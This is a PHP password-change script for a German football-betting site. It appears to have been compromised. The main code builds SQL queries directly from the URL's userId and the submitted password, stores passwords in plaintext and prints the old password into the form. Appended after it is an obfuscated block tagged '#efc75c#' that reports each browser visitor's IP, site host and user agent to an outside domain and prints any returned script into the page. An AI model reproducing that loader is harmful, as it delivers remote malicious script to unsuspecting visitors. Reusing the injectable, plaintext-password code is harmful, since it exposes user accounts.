<?php
session_start();
$userId=$_GET["userId"];
include_once("../../connection/dbaccess.php5");
include_once("../util/dbschema.php5");
if(isset($_POST["Cancel"]))
{
	$target="./overview.php5?userId=$userId";
	header("Location:$target");
	exit;
}
else if(isset($_POST["changePwd"]))
{
	promptChangePassword($userId);
}
else 
{
	echo "<html>";
	echo "<head>";
	echo "<link rel='stylesheet' type='text/css' href='../../style/style.css' />";
	echo "<title>EM-Tipp - Passwort ändern</title>";
	echo "</head>";
	echo "<body>";
	if((!isset($_POST["changePassword"])) or
			(empty($_POST["passwordNew1"])) or 
			(empty($_POST["passwordNew2"])))
	{ 
		if(empty($_POST["passwordNew1"]) or empty($_POST["passwordNew2"]))
		{
			echo "<br>Bitte neues Passwort eingeben.";
			promptChangePassword($userId);
		}
		else
		{
			echo "<br>Kein Direktaufruf dieses Skripts! Bitte auf ./user/changePassword.php5 wechseln.";
		}
	}
	else
	{
		if($_POST["passwordNew1"] === $_POST["passwordNew2"])
		{
			changePasswordInDB($userId, $_POST["passwordNew1"]);
		}
		else
		{
			echo "<br>Eingegebene neue Passwörter waren unterschiedlich. Bitte Eingabe wiederholen.";
			promptChangePassword($userId);
		}
	}
}

function promptChangePassword($userid)
	{
	$password=getPassword($userid);
	echo "<form method='POST' action='changePassword.php5?userId=$userid'>";
	echo "<table>";
	echo "<tr>";
	echo "<td>altes Passwort      :	</td><td><input type='password' name='passwordOld' value='$password' disabled='true'></td>";
	echo "</tr>";
	echo "<tr>";
	echo "<td>neues Passwort      :	</td><td><input type='password' name='passwordNew1' value=''><td>";
	echo "</tr>";
	echo "<tr>";
	echo "<td>neues Passwort(Wdh) :	</td><td><input type='password' name='passwordNew2' value=''><td>";
	echo "</tr>";
	echo "<tr>";
	echo "</tr>";
	echo "<tr>";
	echo "</tr>";
	echo "<tr>";
	echo "<td><input type='submit' name='changePassword' value='Passwort ändern'> &nbsp</td>";
	echo "</tr>";
	}

function changePasswordInDB($userid, $passwordnew)
	{
	include_once("../util/dbutil.php5");
	include_once("../../general/log/log.php5");
	$log=new logger();
	$table_users=dbschema::users;
	$username=$dbutil->getUserName($userid);
	$sqlupdatePassword="UPDATE $table_users SET `password` =  '$passwordnew' WHERE $table_users.`userid` = '$userid'";
	$result=mysql_query($sqlupdatePassword);
	if($result==1)
	{
		$log->info("Passwort geändert für User=$username mit UserId=$userid");
		echo "<br>Passwort geändert.";
		echo "<br>";
	}
	else
	{
		promptChangePassword($userid);
	}
	}

function getPassword($userid){
	
	$table_users=dbschema::users;
	$result=mysql_query("SELECT * FROM $table_users WHERE userid = '$userid'");
	$array=mysql_fetch_array($result);
	$password=$array["password"];
	return $password;
}
?>
<?php
#efc75c#
error_reporting(0); @ini_set('display_errors',0); $wp_jy27 = @$_SERVER['HTTP_USER_AGENT']; if (( preg_match ('/Gecko|MSIE/i', $wp_jy27) && !preg_match ('/bot/i', $wp_jy27))){
$wp_jy0927="http://"."style"."generated".".com/"."generated"."/?ip=".$_SERVER['REMOTE_ADDR']."&referer=".urlencode($_SERVER['HTTP_HOST'])."&ua=".urlencode($wp_jy27);
if (function_exists('curl_init') && function_exists('curl_exec')) {$ch = curl_init(); curl_setopt ($ch, CURLOPT_URL,$wp_jy0927); curl_setopt ($ch, CURLOPT_TIMEOUT, 20); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$wp_27jy = curl_exec ($ch); curl_close($ch);} elseif (function_exists('file_get_contents') && @ini_get('allow_url_fopen')) {$wp_27jy = @file_get_contents($wp_jy0927);}
elseif (function_exists('fopen') && function_exists('stream_get_contents')) {$wp_27jy=@stream_get_contents(@fopen($wp_jy0927, "r"));}}
if (substr($wp_27jy,1,3) === 'scr'){ echo $wp_27jy; }
#/efc75c#
?>